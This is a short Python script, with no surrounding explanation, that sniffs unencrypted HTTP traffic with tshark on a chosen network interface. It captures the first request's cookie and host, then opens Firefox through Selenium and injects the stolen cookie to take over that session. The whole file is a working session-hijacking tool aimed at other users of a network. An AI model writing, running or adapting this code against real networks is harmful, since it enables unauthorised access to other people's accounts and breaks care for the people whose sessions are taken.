from sys import argv
import subprocess
from selenium import webdriver


interface = argv[1]
separator = '|'

cmd = ['tshark', '-i', interface, '-l', '-Y', 'http.request', '-T', 'fields', '-e', 'http.cookie', '-e', 'http.host', '-e', 'http.user_agent',  '-E', f'separator={separator}']

process = subprocess.Popen(cmd, stdout=subprocess.PIPE)

host = ''
cookie = {'name': '', 'value': ''}

browser = webdriver.Firefox()

while True:
    output = process.stdout.readline().decode('utf-8').split('\n')[0]

    if output == '' and process.poll() is not None:
        break

    if output:
        cookie_str, host, user_agent = output.split(separator)
        cookie['name'], cookie['value'] = cookie_str.split('=')
        break


print('captured cookie: ', cookie)

browser.get('http://' + host)
browser.add_cookie(cookie)
browser.refresh()

